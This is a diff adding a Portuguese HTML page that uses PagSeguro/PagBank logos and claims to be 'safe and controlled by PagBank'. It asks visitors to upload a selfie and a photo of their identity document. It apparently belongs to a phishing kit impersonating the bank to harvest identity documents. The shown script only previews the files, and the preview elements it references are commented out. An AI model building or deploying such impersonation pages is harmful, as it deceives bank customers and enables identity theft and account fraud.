@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="stylesheet" href="./style.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
+      rel="stylesheet"
+    />
+    <title>Selfie e Documento</title>
+    <style>
+      #selfie-preview,
+      #doc-preview {
+        width: 200px;
+        height: auto;
+        margin-top: 10px;
+      }
+
+      .file-input {
+        display: none;
+      }
+
+      .custom-file-upload {
+        display: inline-block;
+        padding: 10px 20px;
+        cursor: pointer;
+        font-weight: 600;
+        color: white;
+        background-color: var(--cor--azul); /* Customize the button color */
+        border-radius: 5px;
+        border: none;
+        text-align: center;
+        margin-top: 10px;
+        width: 200px;
+      }
+
+      .custom-file-upload:hover {
+        background-color: var(--cor--azul); /* Darken button on hover */
+      }
+
+      button {
+        width: 360px;
+        height: 40px;
+        font-weight: 800;
+        border-radius: 20px;
+        border: none;
+        color: white;
+        background-color: var(--cor--azul);
+        margin-top: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="logo-top">
+      <img
+        style="position: absolute; width: 120px; margin: -13px -175px"
+        src="./images/logopagseguro.png"
+        alt=""
+      />
+      <img
+        src="./images/sinal-de-interrogacao.png"
+        alt=""
+        style="position: absolute; margin-left: 140px"
+      />
+    </div>
+    <h1
+      style="
+        font-weight: 500;
+        font-size: 23px;
+        margin: 0px 15px;
+        color: #1c1916;
+      "
+    >
+      Esse ambiente é seguro e controlado por PagBank
+    </h1>
+    <p style="margin-top: -55px; margin-left: 15px; color: #616159">
+      Envie seus documentos para concluir e desfrutar de todos os benefícios
+    </p>
+
+    <label for="selfie" class="custom-file-upload">Enviar Selfie</label>
+    <input
+      id="selfie"
+      type="file"
+      accept="image/*"
+      capture="user"
+      class="file-input"
+    />
+    <!-- <img id="selfie-preview" src="" alt="Sua Selfie" /> -->
+
+    <label for="doc" class="custom-file-upload">Enviar Documento</label>
+    <input
+      id="doc"
+      type="file"
+      accept="image/*"
+      capture="environment"
+      class="file-input"
+    />
+    <!-- <img id="doc-preview" src="" alt="Pré-visualização do Documento" /> -->
+
+    <button id="btn-conf-cel">Continuar</button>
+
+    <script>
+      document
+        .getElementById("selfie")
+        .addEventListener("change", function (e) {
+          const file = e.target.files[0];
+          const reader = new FileReader();
+
+          reader.onload = function (e) {
+            const preview = document.getElementById("selfie-preview");
+            preview.src = e.target.result;
+          };
+
+          if (file) {
+            reader.readAsDataURL(file);
+          }
+        });
+
+      document.getElementById("doc").addEventListener("change", function (e) {
+        const file = e.target.files[0];
+        const reader = new FileReader();
+
+        reader.onload = function (e) {
+          const preview = document.getElementById("doc-preview");
+          preview.src = e.target.result;
+        };
+
+        if (file) {
+          reader.readAsDataURL(file);
+        }
+      });
+    </script>
+  </body>
+</html>
